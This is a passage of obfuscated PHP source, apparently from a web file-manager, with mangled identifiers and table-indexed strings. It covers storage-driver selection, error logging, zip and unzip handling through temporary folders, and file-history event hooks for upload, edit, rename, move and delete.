case KodIO::KOD_IO: $“½€¦ï = self::$driverListSystem[$Òı™Ğİê]; break; case KodIO::KOD_SOURCE: $İÔÑş÷Õ = $Òı™Ğİê . $İÔÑş÷Õ; $“½€¦ï = array($†ÅÈáş·[1304] => $†ÅÈáş·[1305], $†ÅÈáş·[6] => $Âè€µ); $“½€¦ï[$†ÅÈáş·[6]][$†ÅÈáş·[1306]] = $Âè€µ[$†ÅÈáş·[492]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Ïé¡¶Æ = $GLOBALS[$†ÅÈáş·[1307]]; self::$driverListUser = array_to_keyvalue($Ïé¡¶Æ, $†ÅÈáş·[492]); } $“½€¦ï = self::$driverListUser[$Òı™Ğİê]; break; case KodIO::KOD_SHARE_LINK: $“½€¦ï = array($†ÅÈáş·[1304] => $†ÅÈáş·[1308], $†ÅÈáş·[6] => $Âè€µ); $èŸ˜¹µ© = Action($†ÅÈáş·[1309])->sharePathInfo($Âè€µ[$†ÅÈáş·[87]]); $İÔÑş÷Õ = $èŸ˜¹µ©[$†ÅÈáş·[192]]; if (!$èŸ˜¹µ©[$†ÅÈáş·[192]]) { $ À‚¶¡ = Model($†ÅÈáş·[692])->getInfoByHash($Âè€µ[$†ÅÈáş·[492]]); $İÔÑş÷Õ = KodIO::clear($ À‚¶¡[$†ÅÈáş·[588]] . $Âè€µ[$†ÅÈáş·[1302]]); $Âè€µ[$†ÅÈáş·[581]] = $ À‚¶¡; $Âè€µ[$†ÅÈáş·[1283]] = $İÔÑş÷Õ; $“½€¦ï = array($†ÅÈáş·[1304] => $†ÅÈáş·[1310], $†ÅÈáş·[6] => $Âè€µ); } else { $“½€¦ï[$†ÅÈáş·[6]][$†ÅÈáş·[1306]] = $èŸ˜¹µ©[$†ÅÈáş·[192]]; } break; case KodIO::KOD_SHARE_ITEM: $“½€¦ï = array($†ÅÈáş·[1304] => $†ÅÈáş·[1311], $†ÅÈáş·[6] => $Âè€µ); $ À‚¶¡ = Model($†ÅÈáş·[692])->getInfo($Âè€µ[$†ÅÈáş·[492]]); if ($ À‚¶¡[$†ÅÈáş·[192]] == $†ÅÈáş·[239]) { $İÔÑş÷Õ = KodIO::clear($ À‚¶¡[$†ÅÈáş·[588]] . $Âè€µ[$†ÅÈáş·[1302]]); $Âè€µ[$†ÅÈáş·[581]] = $ À‚¶¡; $Âè€µ[$†ÅÈáş·[1283]] = $İÔÑş÷Õ; $“½€¦ï = array($†ÅÈáş·[1304] => $†ÅÈáş·[1312], $†ÅÈáş·[6] => $Âè€µ); } else { if (!$İÔÑş÷Õ) { $İÔÑş÷Õ = $ À‚¶¡[$†ÅÈáş·[192]]; } $“½€¦ï[$†ÅÈáş·[6]][$†ÅÈáş·[1306]] = $ À‚¶¡[$†ÅÈáş·[192]]; } break; case KodIO::KOD_SHARE_OUTER: $“½€¦ï = array($†ÅÈáş·[1304] => $†ÅÈáş·[1313], $†ÅÈáş·[6] => $Âè€µ); break; default: $İÔÑş÷Õ = $Âè€µ[$†ÅÈáş·[87]]; $“½€¦ï = array($†ÅÈáş·[1304] => $†ÅÈáş·[1314]); break; } $»©Ã¿…Ó = $Âè€µ[$†ÅÈáş·[87]]; if (!isset(self::$driverCache[$»©Ã¿…Ó])) { $±€¤»ÕË = strtolower($“½€¦ï[$†ÅÈáş·[96]]); $³ÑçßÜ = $GLOBALS[$†ÅÈáş·[6]][$†ÅÈáş·[92]][$†ÅÈáş·[936]]; $¿»Ê€ô = $†ÅÈáş·[77] . (isset($³ÑçßÜ[$±€¤»ÕË]) ? $³ÑçßÜ[$±€¤»ÕË] : ucfirst($±€¤»ÕË)); if (!class_exists($¿»Ê€ô)) { show_json("{$¿»Ê€ô}\40\x6e\x6f\164\x20\145\170\151\x73\164\163\41", !1); } $ÈÙ¡—© = isset($“½€¦ï[$†ÅÈáş·[6]]) ? $“½€¦ï[$†ÅÈáş·[6]] : !1; self::$driverCache[$»©Ã¿…Ó] = new $¿»Ê€ô($ÈÙ¡—©); } $Ô¾Áª•ˆ = self::$driverCache[$»©Ã¿…Ó]; $Ô¾Áª•ˆ->pathDriver = $º‘©ë¸; $Ô¾Áª•ˆ->pathBase = $†ÅÈáş·[12]; if (isset($“½€¦ï[$†ÅÈáş·[6]][$†ÅÈáş·[1315]])) { $Ô¾Áª•ˆ->pathBase = rtrim($“½€¦ï[$†ÅÈáş·[6]][$†ÅÈáş·[1315]], $†ÅÈáş·[8]) . $†ÅÈáş·[8]; $İÔÑş÷Õ = $Ô¾Áª•ˆ->pathBase . ltrim($İÔÑş÷Õ, $†ÅÈáş·[8]); } $İÔÑş÷Õ = $Ô¾Áª•ˆ->getPath($İÔÑş÷Õ); if (isset($Âè€µ[$†ÅÈáş·[1283]])) { $İÔÑş÷Õ = $Âè€µ[$†ÅÈáş·[1283]]; } $Ô¾Áª•ˆ->path = $İÔÑş÷Õ; return $Ô¾Áª•ˆ; } public static function errorTips($áéÉ•îĞ = false, $ŞçâÀ—² = true) { $¦ÜÕ”‡Ì =& $_SERVER[áäÒ½¯Ç]; static $Åú»Ëü¦ = array(); $«î„¹û¤ = 100; if ($áéÉ•îĞ === -1) { return $Åú»Ëü¦ ? $Åú»Ëü¦[count($Åú»Ëü¦) - 1] : $¦ÜÕ”‡Ì[12]; } if ($áéÉ•îĞ === !1) { return implode($¦ÜÕ”‡Ì[221], $Åú»Ëü¦); } if (count($Åú»Ëü¦) >= $«î„¹û¤) { $Åú»Ëü¦ = array_slice($Åú»Ëü¦, $«î„¹û¤ * 0.5, $«î„¹û¤); } $Åú»Ëü¦[] = $áéÉ•îĞ; if (!$ŞçâÀ—²) { return; } write_log($¦ÜÕ”‡Ì[174] . ACTION . $¦ÜÕ”‡Ì[1316] . $áéÉ•îĞ, $¦ÜÕ”‡Ì[1317]); } public static function getLastError($ÍÛ±Éäˆ = '') { $×ù³à Ï = self::errorTips(-1); return $×ù³à Ï ? $×ù³à Ï : $ÍÛ±Éäˆ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $İ¥ûÇÆ; if ($İ¥ûÇÆ) { return $İ¥ûÇÆ; } $«²¤¶¬“ = IO::init($_SERVER[áäÒ½¯Ç][8]); return $«²¤¶¬“; } private static function iconvSystem($á‹ˆí¼ù) { return self::local()->iconvSystem($á‹ˆí¼ù); } private static function iconvApp($„Œµê‚¾) { return self::local()->iconvApp($„Œµê‚¾); } public static function zipFolder($Ëã¨¶ş¼, $úËÜßú = "\x7a\x69\x70", $¥¬–Ãİ¶ = '', $î˜ÄåßÊ = REPEAT_RENAME) { $Îç¼Ö ¢ =& $_SERVER[áäÒ½¯Ç]; $ª½˜Şì = IO::listPath($Ëã¨¶ş¼); if (!$ª½˜Şì) { return !1; } $ª½˜Şì = array_merge($ª½˜Şì[$Îç¼Ö ¢[85]], $ª½˜Şì[$Îç¼Ö ¢[86]]); return self::zip($ª½˜Şì, $úËÜßú, $¥¬–Ãİ¶, $î˜ÄåßÊ); } public static function zip($öä­Íöë, $ŒµäÆ•‘ = "\x7a\151\x70", $µøÏéÛÂ = '', $‹ÒåÑìÂ = REPEAT_RENAME) { $¿—­î› =& $_SERVER[áäÒ½¯Ç]; if (is_string($öä­Íöë) && $öä­Íöë) { $öä­Íöë = array(array($¿—­î›[87] => $öä­Íöë)); } $õæ·¼Ò— = self::init($öä­Íöë[0][$¿—­î›[87]]); $ÀÌé°–Û = self::info($öä­Íöë[0][$¿—­î›[87]]); $Ï¥ëÚ£Ø = $¿—­î›[12]; $“­¹æá = $¿—­î›[12]; $ÆıâÕÒ‡ = $¿—­î›[12]; if ($µøÏéÛÂ && substr($µøÏéÛÂ, -1, 1) != $¿—­î›[8]) { $“­¹æá = get_path_father($µøÏéÛÂ); $ÆıâÕÒ‡ = get_path_this($µøÏéÛÂ); } else { $“­¹æá = self::pathFather($ÀÌé°–Û[$¿—­î›[87]]); $ÆıâÕÒ‡ = $ÀÌé°–Û[$¿—­î›[32]] . $¿—­î›[10] . $ŒµäÆ•‘; if (count($öä­Íöë) > 1) { $Šıû›Š = IO::info($“­¹æá); $ÆıâÕÒ‡ = $Šıû›Š[$¿—­î›[32]] . $¿—­î›[10] . $ŒµäÆ•‘; } if ($µøÏéÛÂ) { $“­¹æá = $µøÏéÛÂ; } } if ($õæ·¼Ò—->getType() == $¿—­î›[107]) { $ïãî«óÕ = self::init($“­¹æá); $¡³¼ª¿À = $ïãî«óÕ->getType() == $¿—­î›[107] ? $“­¹æá : get_path_father($õæ·¼Ò—->path); $¡³¼ª¿À = IO::getPathInner($¡³¼ª¿À); $¡³¼ª¿À = rtrim($¡³¼ª¿À, $¿—­î›[8]) . $¿—­î›[8]; mk_dir($¡³¼ª¿À); } else { $Ï¥ëÚ£Ø = TEMP_FILES . $¿—­î›[1318] . time() . rand_string(8) . $¿—­î›[8]; mk_dir($Ï¥ëÚ£Ø); file_put_contents($Ï¥ëÚ£Ø . $¿—­î›[1319], $¿—­î›[12]); $¡³¼ª¿À = $Ï¥ëÚ£Ø; } $Åù­‹ì = IO::info($¡³¼ª¿À); if (!$Åù­‹ì || !$Åù­‹ì[$¿—­î›[244]]) { show_json(LNG($¿—­î›[1320]), !1); } $•¼×şÀû = self::zipFileList($öä­Íöë, $Ï¥ëÚ£Ø); foreach ($•¼×şÀû as $Á’Ëæ“Õ => $öûôôî) { $•¼×şÀû[$Á’Ëæ“Õ] = self::iconvSystem($öûôôî); } $¸ä‹´ùÌ = get_filename_auto($¡³¼ª¿À . $ÆıâÕÒ‡, $¿—­î›[12], $‹ÒåÑìÂ); KodArchive::create(self::iconvSystem($¸ä‹´ùÌ), $•¼×şÀû); if (!IO::exist($¸ä‹´ùÌ)) { if ($Ï¥ëÚ£Ø) { del_dir($Ï¥ëÚ£Ø); } write_log($¿—­î›[1321] . $¸ä‹´ùÌ, $¿—­î›[398]); show_json(LNG($¿—­î›[1322]), !1); } if (!$Ï¥ëÚ£Ø) { return $¸ä‹´ùÌ; } $»ÌÒ÷²‰ = self::move($¸ä‹´ùÌ, $“­¹æá, $‹ÒåÑìÂ); if ($Ï¥ëÚ£Ø) { del_dir($Ï¥ëÚ£Ø); } if (!$¸ä‹´ùÌ) { write_log($¿—­î›[1323] . $¸ä‹´ùÌ . $¿—­î›[1324] . $“­¹æá, $¿—­î›[398]); show_json(LNG($¿—­î›[1322]), !1); } return $»ÌÒ÷²‰; } public static function unzip($ë¸®ëÕ“, $¿¯´è¬ã, $Ó®ğõÊÌ = "\55\x31", $¡ä„ôö = "\x72\x65\160\x6c\x61\143\x65") { $öø›¯úŒ =& $_SERVER[áäÒ½¯Ç]; $û¹š•ô³ = parent::info($ë¸®ëÕ“); if (!$û¹š•ô³) { show_json(LNG($öø›¯úŒ[1325]), !1); } $¿ïñ›á‚ = IO::infoFullSimple($¿¯´è¬ã); if (!$¿ïñ›á‚) { $¿¯´è¬ã = IO::mkdir($¿¯´è¬ã); } if (isset($¿ïñ›á‚[$öø›¯úŒ[192]]) && trim($¿ïñ›á‚[$öø›¯úŒ[87]], $öø›¯úŒ[8]) != trim($¿¯´è¬ã, $öø›¯úŒ[8])) { $•Å¤Êì = KodIO::make($¿ïñ›á‚[$öø›¯úŒ[191]]); $½ØŸôÌÙ = IO::fileNameAuto($•Å¤Êì, $¿ïñ›á‚[$öø›¯úŒ[32]], REPEAT_RENAME_FOLDER, !0); $¿¯´è¬ã = IO::mkdir($•Å¤Êì . $½ØŸôÌÙ); } $Ó®ğõÊÌ = $Ó®ğõÊÌ && $Ó®ğõÊÌ != $öø›¯úŒ[1326] ? @json_decode($Ó®ğõÊÌ, !0) : -1; $›‡•šö = self::unzipPart($ë¸®ëÕ“, $Ó®ğõÊÌ); if (!$›‡•šö || !IO::exist($›‡•šö[$öø›¯úŒ[241]])) { show_json(LNG($öø›¯úŒ[106]), !1); } $ªæûİšò = $›‡•šö[$öø›¯úŒ[1327]][count($›‡•šö[$öø›¯úŒ[1327]]) - 1]; if ($ªæûİšò[$öø›¯úŒ[1255]] == -1 || substr($ªæûİšò[$öø›¯úŒ[32]], -1, 1) == $öø›¯úŒ[8]) { $êâ”§»¬ = $›‡•šö[$öø›¯úŒ[1328]] . rand_string(10) . $öø›¯úŒ[8]; mk_dir($êâ”§»¬); $—ºÕ“Ù÷ = count($›‡•šö[$öø›¯úŒ[1327]]) == 1 ? IO::ext($ë¸®ëÕ“) : get_path_ext($›‡•šö[$öø›¯úŒ[241]]); $¡Ì¹›äñ = KodArchive::extract(self::iconvSystem($›‡•šö[$öø›¯úŒ[241]]), $êâ”§»¬, $ªæûİšò[$öø›¯úŒ[1255]], $½ØŸôÌÙ, $—ºÕ“Ù÷); self::unzipErrorCheck($¡Ì¹›äñ, array($öø›¯úŒ[1329], $ë¸®ëÕ“, $—ºÕ“Ù÷, $¿¯´è¬ã, $›‡•šö)); Hook::trigger($öø›¯úŒ[1330], $êâ”§»¬); recursion_dir($êâ”§»¬, $ìşØ„Ú§, $‹º¢³şÛ, 0); $†øü¹ã = array_merge($ìşØ„Ú§, $‹º¢³şÛ); $çé‚ñÁ– = array(); foreach ($†øü¹ã as $»…Õá³Ş) { $á‡©ğñÈ = IO::move(self::iconvApp($»…Õá³Ş), $¿¯´è¬ã, $¡ä„ôö); if ($á‡©ğñÈ) { $çé‚ñÁ–[] = $á‡©ğñÈ; } } del_dir($êâ”§»¬); } else { $á‡©ğñÈ = IO::move($›‡•šö[$öø›¯úŒ[241]], $¿¯´è¬ã, $¡ä„ôö, get_path_this($ªæûİšò[$öø›¯úŒ[32]])); if ($á‡©ğñÈ) { $çé‚ñÁ–[] = $á‡©ğñÈ; } } return $çé‚ñÁ– ? $çé‚ñÁ– : !1; } public static function unzipList($È©Ã¸îª) { $ğ¨¬‘“« =& $_SERVER[áäÒ½¯Ç]; $Òœã“ÎÙ = isset($È©Ã¸îª[$ğ¨¬‘“«[1331]]) ? $È©Ã¸îª[$ğ¨¬‘“«[1331]] : !1; $şÀûıÀ± = isset($È©Ã¸îª[$ğ¨¬‘“«[1255]]) ? @json_decode($È©Ã¸îª[$ğ¨¬‘“«[1255]], !0) : -1; $†ÏÊÉÛã = self::unzipPart($È©Ã¸îª[$ğ¨¬‘“«[87]], $şÀûıÀ±); if (!$†ÏÊÉÛã || !IO::exist($†ÏÊÉÛã[$ğ¨¬‘“«[241]])) { show_json(LNG($ğ¨¬‘“«[106]), !1); } $òµåÈ¹ñ = $†ÏÊÉÛã[$ğ¨¬‘“«[1327]][count($†ÏÊÉÛã[$ğ¨¬‘“«[1327]]) - 1]; $®ÑÄ£…û = in_array(IO::ext($†ÏÊÉÛã[$ğ¨¬‘“«[241]]), array($ğ¨¬‘“«[398], $ğ¨¬‘“«[1332], $ğ¨¬‘“«[1333], $ğ¨¬‘“«[1334], $ğ¨¬‘“«[1335], $ğ¨¬‘“«[1336])); if (!$Òœã“ÎÙ && ($òµåÈ¹ñ[$ğ¨¬‘“«[1255]] == -1 || $®ÑÄ£…û)) { $Œ¤í†÷ = $†ÏÊÉÛã[$ğ¨¬‘“«[1328]] . get_path_this($†ÏÊÉÛã[$ğ¨¬‘“«[241]]) . $ğ¨¬‘“«[1337]; if (!IO::exist($Œ¤í†÷)) { $÷‘Ã‘ğõ = $òµåÈ¹ñ[$ğ¨¬‘“«[1255]] == -1 ? get_path_ext(IO::pathThis($È©Ã¸îª[$ğ¨¬‘“«[87]])) : get_path_ext($†ÏÊÉÛã[$ğ¨¬‘“«[241]]); $ŒÈ„Ç»å = KodArchive::listContent(self::iconvSystem($†ÏÊÉÛã[$ğ¨¬‘“«[241]]), !0, $÷‘Ã‘ğõ); self::unzipErrorCheck($ŒÈ„Ç»å, array($ğ¨¬‘“«[1338], $È©Ã¸îª, $†ÏÊÉÛã)); @file_put_contents($Œ¤í†÷, json_encode($ŒÈ„Ç»å[$ğ¨¬‘“«[1339]])); } return @json_decode(IO::getContent($Œ¤í†÷), !0); } IO::fileOut($†ÏÊÉÛã[$ğ¨¬‘“«[241]], $Òœã“ÎÙ, get_path_this($òµåÈ¹ñ[$ğ¨¬‘“«[32]])); die; } private static function zipFileList($õëˆøÄ„, $·Øºç‹ = false) { $ú£§§¡‰ =& $_SERVER[áäÒ½¯Ç]; $ßŸÓÊ· = array(); foreach ($õëˆøÄ„ as $Ã”®İïˆ) { $öÔ®ËÀˆ = $Ã”®İïˆ[$ú£§§¡‰[87]]; if ($·Øºç‹) { $öÔ®ËÀˆ = self::copy($Ã”®İïˆ[$ú£§§¡‰[87]], $·Øºç‹, $ú£§§¡‰[929]); } else { $ı´Ë¨ó = self::init($Ã”®İïˆ[$ú£§§¡‰[87]]); if ($ı´Ë¨ó->getType() == $ú£§§¡‰[107]) { $öÔ®ËÀˆ = $ı´Ë¨ó->path; } } if ($öÔ®ËÀˆ && self::local()->exist($öÔ®ËÀˆ)) { $ßŸÓÊ·[$Ã”®İïˆ[$ú£§§¡‰[87]]] = $öÔ®ËÀˆ; } } if (!empty($ßŸÓÊ·)) { return array_values($ßŸÓÊ·); } show_json(LNG($ú£§§¡‰[1297]), !1); } private static function localFilePath($Ó›‚ç­) { $ş„ú¿ŒÁ =& $_SERVER[áäÒ½¯Ç]; $¼Ğß¨Øå = KodIO::parse($Ó›‚ç­); if ($¼Ğß¨Øå[$ş„ú¿ŒÁ[33]] == KodIO::KOD_SOURCE) { $¦±ğ  Ï = Model($ş„ú¿ŒÁ[935])->fileInfoGet(KodIO::sourceID($Ó›‚ç­)); if (!$¦±ğ  Ï[$ş„ú¿ŒÁ[87]]) { show_json($ş„ú¿ŒÁ[1340], !1); } $Ó›‚ç­ = $¦±ğ  Ï[$ş„ú¿ŒÁ[87]]; } $³ÀÌÌ’ª = self::init($Ó›‚ç­); if ($³ÀÌÌ’ª->pathParse[$ş„ú¿ŒÁ[1283]]) { $Ó›‚ç­ = $³ÀÌÌ’ª->pathParse[$ş„ú¿ŒÁ[1283]]; $³ÀÌÌ’ª = self::init($Ó›‚ç­); } $®÷Ñ¶Ñ± = $³ÀÌÌ’ª->getType(); if ($®÷Ñ¶Ñ± == $ş„ú¿ŒÁ[107] || $®÷Ñ¶Ñ± == $ş„ú¿ŒÁ[1341]) { if (!$³ÀÌÌ’ª->exist($³ÀÌÌ’ª->path)) { show_json(LNG($ş„ú¿ŒÁ[106]), !1); } return $³ÀÌÌ’ª->path; } return !1; } public static function unzipPart($ì‰¢„, $ÛğÆßáÕ = -1) { $œŞë‹êë =& $_SERVER[áäÒ½¯Ç]; $´°ÃÌ™ê = IO::pathThis($ì‰¢„); if (!$ÛğÆßáÕ || $ÛğÆßáÕ == -1) { $šÑ¹Ïóú = array(array($œŞë‹êë[32] => $´°ÃÌ™ê, $œŞë‹êë[1255] => -1)); $šÑ¹Ïóú[0][$œŞë‹êë[1342]] = $šÑ¹Ïóú[0][$œŞë‹êë[32]]; } else { if (is_array($ÛğÆßáÕ)) { $šÑ¹Ïóú = $ÛğÆßáÕ; $Š¦…™—œ = count($šÑ¹Ïóú) - 1; for ($ÕÁ¯û²‘ = 0; $ÕÁ¯û²‘ <= $Š¦…™—œ; $ÕÁ¯û²‘++) { $ùé¹¶ë™ = $šÑ¹Ïóú[$ÕÁ¯û²‘]; $‚¦§ØŒ = get_path_this($ùé¹¶ë™[$œŞë‹êë[32]]) . (checkExtSafe($ùé¹¶ë™[$œŞë‹êë[32]]) ? $œŞë‹êë[12] : $œŞë‹êë[1343]); $šÑ¹Ïóú[$ÕÁ¯û²‘][$œŞë‹êë[1342]] = $œŞë‹êë[1344] . intval($ùé¹¶ë™[$œŞë‹êë[1255]]) . $œŞë‹êë[482] . $‚¦§ØŒ; if ($ÕÁ¯û²‘ == 0) { continue; } $šÑ¹Ïóú[$ÕÁ¯û²‘][$œŞë‹êë[1342]] = $šÑ¹Ïóú[$ÕÁ¯û²‘ - 1][$œŞë‹êë[1342]] . $œŞë‹êë[1345] . $šÑ¹Ïóú[$ÕÁ¯û²‘][$œŞë‹êë[1342]]; } } } if (!is_array($šÑ¹Ïóú) || count($šÑ¹Ïóú) == 0) { return !1; } $¾“‰ŒŠ¥ = $šÑ¹Ïóú[count($šÑ¹Ïóú) - 1]; if (!IO::exist($ì‰¢„)) { return !1; } $ÏªĞ×ôÎ = TEMP_FILES . $œŞë‹êë[1346] . kodIO::hashPathSafe($ì‰¢„) . $œŞë‹êë[8]; $¤ìÕİØ = $ÏªĞ×ôÎ . $¾“‰ŒŠ¥[$œŞë‹êë[1342]]; mk_dir($ÏªĞ×ôÎ); file_put_contents(TEMP_FILES . $œŞë‹êë[1319], $œŞë‹êë[12]); if (IO::exist($¤ìÕİØ)) { return array($œŞë‹êë[241] => $¤ìÕİØ, $œŞë‹êë[1327] => $šÑ¹Ïóú, $œŞë‹êë[1328] => $ÏªĞ×ôÎ); } $·‹øšÂ¡ = self::localFilePath($ì‰¢„); if (!$·‹øšÂ¡) { $·‹øšÂ¡ = $ÏªĞ×ôÎ . $œŞë‹êë[1347]; if (!IO::exist($·‹øšÂ¡)) { self::copy($ì‰¢„, $ÏªĞ×ôÎ, !1, get_path_this($·‹øšÂ¡)); } } if (!$·‹øšÂ¡ || !IO::exist($·‹øšÂ¡)) { return !1; } if ($¾“‰ŒŠ¥[$œŞë‹êë[1255]] == -1) { return array($œŞë‹êë[241] => $·‹øšÂ¡, $œŞë‹êë[1327] => $šÑ¹Ïóú, $œŞë‹êë[1328] => $ÏªĞ×ôÎ); } $Æ©ºÚŸì = $·‹øšÂ¡; foreach ($šÑ¹Ïóú as $ÕÁ¯û²‘ => $ùé¹¶ë™) { if (!$ùé¹¶ë™ || $ùé¹¶ë™[$œŞë‹êë[1255]] == $œŞë‹êë[1326]) { break; } if (substr($ùé¹¶ë™[$œŞë‹êë[32]], -1, 1) == $œŞë‹êë[8]) { break; } $ğ¼ÔºÚ‰ = in_array(get_path_ext($ùé¹¶ë™[$œŞë‹êë[1342]]), array($œŞë‹êë[398], $œŞë‹êë[1332], $œŞë‹êë[1333], $œŞë‹êë[1334], $œŞë‹êë[1335], $œŞë‹êë[1336])); $Õ÷“åÏŞ = $ÕÁ¯û²‘ == count($šÑ¹Ïóú) - 1 && $ğ¼ÔºÚ‰; $”£ğ€æ = $ÏªĞ×ôÎ . $ùé¹¶ë™[$œŞë‹êë[1342]]; $š×ß¸—„ = $ÏªĞ×ôÎ . get_path_this($ùé¹¶ë™[$œŞë‹êë[32]]); if (IO::exist($”£ğ€æ)) { $Æ©ºÚŸì = $”£ğ€æ; continue; } $ ş³¤¤ = $ÕÁ¯û²‘ == 0 ? get_path_ext($´°ÃÌ™ê) : get_path_ext($Æ©ºÚŸì); $Õ™Ä˜ƒš = KodArchive::extract(self::iconvSystem($Æ©ºÚŸì), $ÏªĞ×ôÎ, $ùé¹¶ë™[$œŞë‹êë[1255]], $—ş¶Ô—¸, $ ş³¤¤); self::unzipErrorCheck($Õ™Ä˜ƒš, array($œŞë‹êë[1348], $ì‰¢„, $šÑ¹Ïóú, $ùé¹¶ë™, $”£ğ€æ)); if (IO::exist($š×ß¸—„)) { IO::rename($š×ß¸—„, get_path_this($”£ğ€æ)); } $Æ©ºÚŸì = $”£ğ€æ; } $¤ìÕİØ = $Æ©ºÚŸì; return array($œŞë‹êë[241] => $Æ©ºÚŸì, $œŞë‹êë[1327] => $šÑ¹Ïóú, $œŞë‹êë[1328] => $ÏªĞ×ôÎ); } private static function unzipErrorCheck($Ü¤íŞë, $´…óØ­û = false) { $ñ•¸Š¿Œ =& $_SERVER[áäÒ½¯Ç]; if ($Ü¤íŞë[$ñ•¸Š¿Œ[1349]]) { return !0; } write_log(array($ñ•¸Š¿Œ[1350], $Ü¤íŞë, $´…óØ­û), $ñ•¸Š¿Œ[1351]); $âîîÎ«— = is_array($Ü¤íŞë[$ñ•¸Š¿Œ[1339]]) ? json_encode($Ü¤íŞë[$ñ•¸Š¿Œ[1339]]) : $Ü¤íŞë[$ñ•¸Š¿Œ[1339]]; show_json($ñ•¸Š¿Œ[1352] . $âîîÎ«—, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¬¯’ÇØ¾ =& $_SERVER[áäÒ½¯Ç]; $Ò¿óªÆµ = $GLOBALS[$¬¯’ÇØ¾[6]][$¬¯’ÇØ¾[92]]; if ($Ò¿óªÆµ[$¬¯’ÇØ¾[1353]] != 1) { return; } if ($Ò¿óªÆµ[$¬¯’ÇØ¾[1354]] <= 0) { return; } if (isset($_REQUEST[$¬¯’ÇØ¾[1355]]) && $_REQUEST[$¬¯’ÇØ¾[1355]] == $¬¯’ÇØ¾[91]) { return; } Hook::bind($¬¯’ÇØ¾[1356], $¬¯’ÇØ¾[1357]); Hook::bind($¬¯’ÇØ¾[1358], $¬¯’ÇØ¾[1359]); Hook::bind($¬¯’ÇØ¾[1360], $¬¯’ÇØ¾[1361]); Hook::bind($¬¯’ÇØ¾[1362], $¬¯’ÇØ¾[1363]); Hook::bind($¬¯’ÇØ¾[1364], $¬¯’ÇØ¾[1365]); Hook::bind($¬¯’ÇØ¾[1366], $¬¯’ÇØ¾[1367]); } public static function eventBeforeUpload($ˆÖç×Ş) { if ($ˆÖç×Ş[3] && $ˆÖç×Ş[3] != REPEAT_REPLACE) { return; } $ˆ²Õ§•È = self::parsePath($ˆÖç×Ş[0]); if (!$ˆ²Õ§•È) { return; } self::add($ˆ²Õ§•È); } public static function eventBeforeEdit($Ï¡ƒÀÍ) { $ù§„ÄÖ¢ = self::parsePath($Ï¡ƒÀÍ[0]); if (!$ù§„ÄÖ¢) { return; } self::add($ù§„ÄÖ¢); } public static function eventBeforeCopyFile($ëù€ÌÀ¦, $È«óÖÂÜ, $’¯şÒ¡İ, $‰õê€‰Ò, $Ğ°Ò”ª, $«¨º‡ˆ”) { $ûÉ‚Œ¬© =& $_SERVER[áäÒ½¯Ç]; if (isset($’¯şÒ¡İ->_data[$ûÉ‚Œ¬©[1287]]) && $’¯şÒ¡İ->_data[$ûÉ‚Œ¬©[1287]]) { return; } $—‡ø±Â¨ = $’¯şÒ¡İ->getPathOuter($‰õê€‰Ò); $¯üì€ûË = self::parsePath($—‡ø±Â¨); if (!$¯üì€ûË) { return; } self::add($¯üì€ûË); } public static function eventBeforeRename($•¹¥ÑÙ) { $ì‘—§ê¤ =& $_SERVER[áäÒ½¯Ç]; $‡û”ï®‹ = self::parsePath($•¹¥ÑÙ[0]); if (!$‡û”ï®‹) { return; } $Ê¨°†¬ = self::checkInHistory($‡û”ï®‹); if (!$Ê¨°†¬) { return; } if ($Ê¨°†¬[$ì‘—§ê¤[33]] == $ì‘—§ê¤[241]) { $‘º›‰¸í = self::listData($‡û”ï®‹); if ($‘º›‰¸í && $‘º›‰¸í[$ì‘—§ê¤[455]]) { self::moveHistory($‡û”ï®‹, $•¹¥ÑÙ[1]); } } else { IO::rename($Ê¨°†¬[$ì‘—§ê¤[87]], $•¹¥ÑÙ[1]); } } public static function eventBeforeMove($Ì™á‰Ó) { $ÚÆÊ¬± =& $_SERVER[áäÒ½¯Ç]; $ÈåÇ£’  = self::parsePath($Ì™á‰Ó[0]); if (!$ÈåÇ£’ ) { return; } $¡…ü³Äù = self::parsePath($Ì™á‰Ó[1]); if (!$¡…ü³Äù) { return; } $ÓÕ¼š¦ = $Ì™á‰Ó[3]; $ºêâ–ı = self::checkInHistory($ÈåÇ£’ ); if (!$ºêâ–ı) { return; } $ìµ»£³— = self::pathHistory($¡…ü³Äù); if ($ºêâ–ı[$ÚÆÊ¬±[33]] == $ÚÆÊ¬±[241]) { $Ö€­›±œ = self::listData($ÈåÇ£’ ); $Ôûµå® = rtrim($¡…ü³Äù, $ÚÆÊ¬±[8]) . $ÚÆÊ¬±[8] . ($ÓÕ¼š¦ ? $ÓÕ¼š¦ : get_path_this($ÈåÇ£’ )); $ÖÚ„ğØ¡ = self::listData($Ôûµå®); if ($Ö€­›±œ && $Ö€­›±œ[$ÚÆÊ¬±[455]] && $ÖÚ„ğØ¡ && $ÖÚ„ğØ¡[$ÚÆÊ¬±[455]]) { return self::clear($ÈåÇ£’ ); } if ($Ö€­›±œ && $Ö€­›±œ[$ÚÆÊ¬±[455]]) { self::moveHistory($ÈåÇ£’ , $ÓÕ¼š¦, $ìµ»£³—); } } else { IO::move($ºêâ–ı[$ÚÆÊ¬±[87]], $ìµ»£³—, !1, $ÓÕ¼š¦); self::clearEmptyFolder(IO::pathFather($ºêâ–ı[$ÚÆÊ¬±[87]])); } } public static function eventAfterRemove($áÑÓªŒ©, $ûšì‘Ü) { $ôëœÕÒÃ =& $_SERVER[áäÒ½¯Ç]; if (!$ûšì‘Ü) { return; } $¿ØØŸ½ = self::parsePath($áÑÓªŒ©[0]); if (!$¿ØØŸ½) { return; } $µôĞŸ—Á = self::checkInHistory($¿ØØŸ½); if (!$µôĞŸ—Á) { return; } if ($µôĞŸ—Á[$ôëœÕÒÃ[33]] == $ôëœÕÒÃ[241]) { $¨¦ÙŠ = self::listData($¿ØØŸ½, !1); if ($¨¦ÙŠ && $¨¦ÙŠ[$ôëœÕÒÃ[455]]) { self::clear($¿ØØŸ½, !1); } } else { IO::remove($µôĞŸ—Á[$ôëœÕÒÃ[87]]); self::clearEmptyFolder(IO::pathFather($µôĞŸ—Á[$ôëœÕÒÃ[87]])); } } private static function checkInHistory($¥ŒöÚ) { $ßœèİ÷¹ = self::pathHistory($¥ŒöÚ); if (!IO::exist($ßœèİ÷¹)) { $ßœèİ÷¹ .= $_SERVER[áäÒ½¯Ç][1368]; } return IO::exist($ßœèİ÷¹) ? IO::info($ßœèİ÷¹) : !1; } private static function parsePath($”Å°ïÑÚ) { $­ãÚº†ø =& $_SERVER[áäÒ½¯Ç]; if (!$”Å°ïÑÚ) { return !1; } if 